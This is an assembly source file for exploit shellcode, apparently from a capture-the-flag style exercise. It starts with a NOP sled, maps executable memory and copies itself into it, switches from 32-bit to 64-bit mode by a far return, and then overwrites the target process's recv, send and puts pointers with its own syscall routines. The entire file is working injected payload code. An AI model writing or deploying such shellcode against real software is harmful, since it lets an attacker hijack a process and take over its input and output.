bits 32
nop
nop
nop
;get eip onto the stack
call StartPos
StartPos:

;store registers
pusha

;get a chunk of memory to put a copy of ourselves in
;mmap(0, 4096, 7, 0x22, 0, 0)
mov eax, 192
xor ebx, ebx
mov ecx, 4096
mov edx, 7
mov esi, 0x22
xor edi, edi
dec edi
xor ebp, ebp
int 0x80
mov [esp+(7*4)], eax	;rewrite eax on the stack

;eax is address to move to
;load esi with the starting location
;move from CallPos to the end of our block of data
mov edi, eax
mov esi, [esp+(8*4)]
mov ecx, EndOfCode-StartPos
rep movsb

;restore registers, only eax is changed, get rid of our call return at the beginning
popa
add esp, 4

;store our original
push eax

;adjust rax to be at Jmp64_Bit
add eax, Jmp64_Bit-StartPos
push 0x33
push eax
retf

align 8
bits 64
Jmp64_Bit:

;we now have high registers we can use to avoid more register damage

;get our original pointer to the buffer we are executing in
mov r8d, dword [rsp]

;get the original return pointer and move past it
mov r9d, dword [rsp+4]
add rsp, 8

;setup recv, r10 = pointer in binary
;r11 = pointer to Recv_64
mov r10, r9
and r10, 0xfffff000
add r10, RECV
mov r11, r8
add r11, Recv_64-StartPos
mov [r10], r11			;note, we destroy close() doing this but the client shouldn't ever call it as the fail payload forces an exit

;setup send, r10 = pointer in binary
;r11 = pointer to Send_64
mov r10, r9
and r10, 0xfffff000
add r10, SEND
mov r11, r8
add r11, Send_64-StartPos
mov [r10], r11			;overwrite 4 unused bytes in the data area

;setup puts, r10 = pointer in binary
;r11 = pointer to Puts_64
mov r10, r9
and r10, 0xfffff000
add r10, PUTS
mov r11, r8
add r11, Puts_64-StartPos
mov [r10], r11			;overwrite 4 unused bytes in the data area

;set a value into the buffer then return
mov r11d, [rsp]
mov dword [r11], 0x64646464
mov dword [r11+4], 0x64646464
mov rax, 8
jmp r9

align 8
Send_64:
	push rbp
	mov rbp, rsp

	;store registers
	push rdi
	push rsi
	push rdx
	push r10
	push r8
	push r9

	;do syscall for send
	mov rax, 44
	mov edi, [rbp+0x10]
	mov esi, [rbp+0x18]
	mov edx, [rbp+0x20]
	mov r10d, [rbp+0x28]
	xor r8, r8
	xor r9, r9
	syscall

	;restore and return
	pop r9
	pop r8
	pop r10
	pop rdx
	pop rsi
	pop rdi
	pop rbp
	ret

align 8
Recv_64:
	push rbp
	mov rbp, rsp

	;store registers
	push rdi
	push rsi
	push rdx
	push r10
	push r8
	push r9

	;do syscall for recv
	mov rax, 45
	mov edi, [rbp+0x10]
	mov esi, [rbp+0x18]
	mov edx, [rbp+0x20]
	mov r10d, [rbp+0x28]
	xor r8, r8
	xor r9, r9
	syscall

	;restore and return
	pop r9
	pop r8
	pop r10
	pop rdx
	pop rsi
	pop rdi
	pop rbp
	ret

align 8
Puts_64:
	;write(1, msg, strlen(msg))

	;get the string
	mov esi, [rsp+8]

	;find out it's length
	xor rax, rax
	mov rdi, rsi
	xor rcx, rcx
	sub rcx, 1
	repne scasb

	;calculate string length into rdi
	sub rdi, rsi

	;call write
	mov rax, 1
	mov rdx, rdi	;len
	mov rdi, rax	;1
	;mov rsi, rsi	;ptr
	xor r10, r10
	xor r8, r8
	xor r9, r9
	syscall

	;call exit
	mov rax, 60
	xor rdx, rdx
	xor rsi, rsi
	xor rdi, rdi
	xor r10, r10
	xor r8, r8
	xor r9, r9
	syscall

EndOfCode:
